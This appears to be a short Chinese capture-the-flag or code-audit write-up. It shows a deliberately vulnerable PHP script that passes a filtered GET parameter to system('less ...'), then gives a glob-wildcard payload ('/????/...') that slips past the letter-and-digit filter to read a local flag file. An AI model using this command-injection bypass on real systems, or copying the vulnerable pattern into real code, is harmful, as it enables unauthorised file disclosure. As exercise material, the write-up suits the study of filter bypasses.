链接: https://t.zsxq.com/VrnQjeY

```
<?php
本地flag路径为 /data/sublime/php/audit/3/flag.txt

function waf($file){
    return preg_replace('/[a-z0-9.]/i', '', "$file");
}


$filename = $_GET['file'];
$file = waf($filename);
echo $file;
system('less '.$file);
```

过滤了`a-z0-9.` 这些字符，那么思路就应该是考察linux的通配符的问题了，查了一下linux的通配符


* - 通配符,代表任意字符(0到多个)

? - 通配符,代表一个字符

因此可以构造如下

		$filename = '/????/???????/???/?????/?/*'

当然中间几个?可以用*来代替，但是这样匹配的内容很很多
